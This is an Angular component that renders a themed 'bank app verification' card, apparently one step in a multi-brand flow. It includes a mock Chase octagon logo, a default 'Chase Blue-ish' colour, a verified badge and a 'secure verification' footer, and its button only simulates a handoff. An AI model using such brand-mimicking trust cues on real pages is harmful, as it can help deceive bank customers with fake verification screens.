import { Component, inject, computed, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { StateService } from '../services/state.service';
import { TranslatePipe } from '../pipes/translate.pipe';
import { ButtonComponent, ButtonVariant } from './ui/button.component';
import { CardComponent, CardVariant } from './ui/card.component';

@Component({
  selector: 'app-bank-app-verification',
  standalone: true,
  imports: [CommonModule, TranslatePipe, ButtonComponent, CardComponent],
  host: {
    '[attr.data-theme]': 'currentFlowId()',
    'class': 'block w-full max-w-md mx-auto animate-in fade-in zoom-in-95 duration-500'
  },
  template: `
    <ui-card [variant]="cardVariant()">
      <div class="flex flex-col items-center text-center">
        
        <!-- App Icon (Dynamic) -->
        <div class="relative w-24 h-24 mb-6 group cursor-pointer transition-transform active:scale-95">
           <div class="absolute inset-0 rounded-[22px] shadow-xl opacity-20 transform rotate-6 scale-95" [style.background]="brandColor()"></div>
           <div class="absolute inset-0 rounded-[22px] shadow-2xl flex items-center justify-center overflow-hidden border border-white/10 backdrop-blur-sm"
                [style.background]="iconBgGradient()">
                
                @if(currentFlowId() === 'chase') {
                   <!-- Chase Octagon Mock -->
                   <div class="w-12 h-12 bg-white skew-x-12"></div>
                } @else {
                   <span class="material-icons text-5xl text-white drop-shadow-md">account_balance</span>
                }
           </div>
           
           <!-- Verified Badge -->
           <div class="absolute -top-1 -right-1 w-8 h-8 rounded-full bg-green-500 border-4 border-white flex items-center justify-center shadow-lg animate-bounce-short">
              <span class="material-icons text-white text-sm font-bold">check</span>
           </div>
        </div>

        <h1 class="text-2xl font-bold mb-3 tracking-tight" [style.color]="textColor()">
           {{ 'BANK_APP.TITLE' | translate }}
        </h1>

        <p class="text-base text-slate-500 leading-relaxed max-w-[90%] mb-8 animate-fade-in delay-100">
           {{ 'BANK_APP.DESC' | translate }}
        </p>

        <!-- Info Box -->
        <div class="w-full bg-slate-50 border border-slate-100 rounded-xl p-5 mb-8 flex items-start gap-4 text-left shadow-sm animate-fade-in delay-200">
            <span class="material-icons mt-0.5 text-blue-600">verified_user</span>
            <div class="text-sm">
                <p class="font-bold mb-1 text-slate-800">{{ 'BANK_APP.WHY_TITLE' | translate }}</p>
                <p class="text-slate-600 leading-relaxed">{{ 'BANK_APP.WHY_DESC' | translate }}</p>
            </div>
        </div>
        
        <!-- Deep Link Button -->
        <div class="w-full">
            <ui-button 
               (click)="onApproved()" 
               [fullWidth]="true"
               [variant]="buttonVariant()"
               class="shadow-lg shadow-blue-900/10">
               <div class="flex items-center justify-center gap-2">
                 <span>{{ 'BANK_APP.BUTTON' | translate }}</span>
                 <span class="material-icons text-sm opacity-80">open_in_new</span>
               </div>
            </ui-button>
        </div>
      </div>

      <!-- Secure Footer -->
      <div slot="footer" class="flex items-center gap-2 justify-center opacity-60 py-1">
           <span class="material-icons text-sm text-green-600">lock</span>
           <p class="text-xs text-slate-500 font-bold uppercase tracking-wider">
              {{ 'BANK_APP.SECURE_VERIFICATION' | translate }}
           </p>
      </div>
    </ui-card>
  `,
  styles: [`
    :host { display: block; }
    .animate-bounce-short { animation: bounce-short 2s infinite; }
    @keyframes bounce-short {
      0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
      40% {transform: translateY(-6px);}
      60% {transform: translateY(-3px);}
    }
  `]
})
export class BankAppVerificationComponent {
  state = inject(StateService);

  currentFlow = this.state.currentFlow;
  currentFlowId = computed(() => this.currentFlow()?.id || 'generic');
  theme = computed(() => this.state.currentFlow()?.theme);

  brandColor = computed(() => this.theme()?.brandColor || '#003087'); // Default Chase Blue-ish
  textColor = computed(() => this.theme()?.input.textColor || '#001C64');

  iconBgGradient = computed(() => {
    const c = this.brandColor();
    return `linear-gradient(135deg, ${c}, ${this.adjustColor(c, -40)})`;
  });

  buttonVariant = computed<ButtonVariant>(() => {
    // Could map specific variants if button component supports 'brand' variant
    return 'primary';
  });

  cardVariant = computed<CardVariant>(() => {
    // Different variants based on flow if needed
    return 'elevated';
  });

  onApproved() {
    // Simulate App-to-App handoff success
    this.state.currentView.set('success');
  }

  // Helper to darken color for gradient
  adjustColor(color: string, amount: number) {
    return color; // Simplified for now
  }
}
